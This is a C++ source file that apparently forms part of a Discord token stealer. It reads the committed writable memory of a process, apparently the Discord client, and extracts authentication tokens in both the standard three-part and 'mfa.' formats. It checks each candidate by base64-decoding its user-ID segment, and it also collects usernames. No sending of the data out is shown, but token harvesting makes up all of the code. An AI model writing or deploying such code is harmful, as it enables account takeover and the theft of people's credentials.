// discord.cpp
#include <include/global.hpp>

namespace core {

	std::vector<std::string> discord_c::find_tokens( )
	{
		std::vector<std::string> results;

		this->walk_memory( [ & ]( const char* data, const std::size_t size )
			{
				this->scan_for_tokens( data, size, &results );
			} );

		return results;
	}

	std::vector<std::string> discord_c::find_usernames( )
	{
		std::vector<std::string> results;

		this->walk_memory( [ & ]( const char* data, const std::size_t size )
			{
				this->scan_for_usernames( data, size, &results );
			} );

		return results;
	}

	template<typename t>
	void discord_c::walk_memory( t callback )
	{
		MEMORY_BASIC_INFORMATION memory_info{ };
		for ( auto* i = static_cast< const std::uint8_t* >( nullptr );; i += memory_info.RegionSize )
		{
			if ( !g->m_memory.query_memory( i, memory_info ) ) {
				break;
			}

			if ( memory_info.State != MEM_COMMIT or !( memory_info.Protect & ( PAGE_READWRITE | PAGE_EXECUTE_READWRITE ) ) ) {
				continue;
			}

			std::vector<char> buffer( memory_info.RegionSize );
			if ( !g->m_memory.read_virtual( i, buffer.data( ), memory_info.RegionSize ) ) {
				continue;
			}

			callback( buffer.data( ), buffer.size( ) );
		}
	}

	void discord_c::scan_for_tokens( const char* data, const std::size_t size, std::vector<std::string>* results ) const
	{
		const auto next = [ ]( const char* data, const std::size_t size, std::size_t& position ) -> std::size_t
			{
				const auto start{ position };
				while ( position < size and discord_c::is_token_char( data[ position ] ) ) {
					position++;
				}

				return position - start;
			};

		for ( std::size_t i{ 0 }; i < size; )
		{
			if ( !discord_c::is_token_char( data[ i ] ) ) {
				i++;
				continue;
			}

			const auto start{ i };
			const auto first{ next( data, size, i ) };

			if ( i >= size or data[ i ] != '.' ) {
				continue;
			}

			i++;
			const auto second{ next( data, size, i ) };

			if ( std::string_view( data + start, first ) == "mfa" and second == 84 )
			{
				const std::string_view full( data + start, i - start );
				if ( std::ranges::find( *results, full ) == results->end( ) ) {
					results->emplace_back( full );
				}

				continue;
			}

			if ( first < 24 or first > 26 or second != 6 or i >= size or data[ i ] != '.' ) {
				continue;
			}

			i++;
			const auto third{ next( data, size, i ) };

			if ( third < 34 or third > 38 or !discord_c::validate_token( data + start, i - start ) ) {
				continue;
			}

			const std::string_view full( data + start, i - start );
			if ( std::ranges::find( *results, full ) == results->end( ) ) {
				results->emplace_back( full );
			}
		}
	}

	void discord_c::scan_for_usernames( const char* data, const std::size_t size, std::vector<std::string>* results ) const
	{
		constexpr std::string_view key{ "\"username\":\"" };

		for ( std::size_t i{ 0 }; i + key.size( ) < size; i++ )
		{
			if ( std::string_view( data + i, key.size( ) ) != key ) {
				continue;
			}

			i += key.size( );
			const auto start{ i };

			while ( i < size and data[ i ] != '"' and data[ i ] != '\0' ) {
				i++;
			}

			if ( i == start or i - start > 32 ) {
				continue;
			}

			const std::string_view username( data + start, i - start );
			if ( std::ranges::find( *results, username ) == results->end( ) ) {
				results->emplace_back( username );
			}
		}
	}

	bool discord_c::is_token_char( const char character )
	{
		return ( character >= 'A' and character <= 'Z' ) or ( character >= 'a' and character <= 'z' ) or ( character >= '0' and character <= '9' ) or character == '_' or character == '-';
	}

	bool discord_c::validate_token( const char* data, const std::size_t length )
	{
		const auto first_dot{ std::string_view( data, length ).find( '.' ) };
		if ( first_dot == std::string_view::npos ) {
			return false;
		}

		unsigned long decoded_size{ 0 };
		if ( !::CryptStringToBinaryA( data, static_cast< unsigned long >( first_dot ), CRYPT_STRING_BASE64, nullptr, &decoded_size, nullptr, nullptr ) ) {
			return false;
		}

		std::string decoded( decoded_size, '\0' );
		if ( !::CryptStringToBinaryA( data, static_cast< unsigned long >( first_dot ), CRYPT_STRING_BASE64, reinterpret_cast< BYTE* >( decoded.data( ) ), &decoded_size, nullptr, nullptr ) ) {
			return false;
		}

		decoded.resize( decoded_size );
		return !decoded.empty( ) and std::ranges::all_of( decoded, ::isdigit );
	}

} // namespace core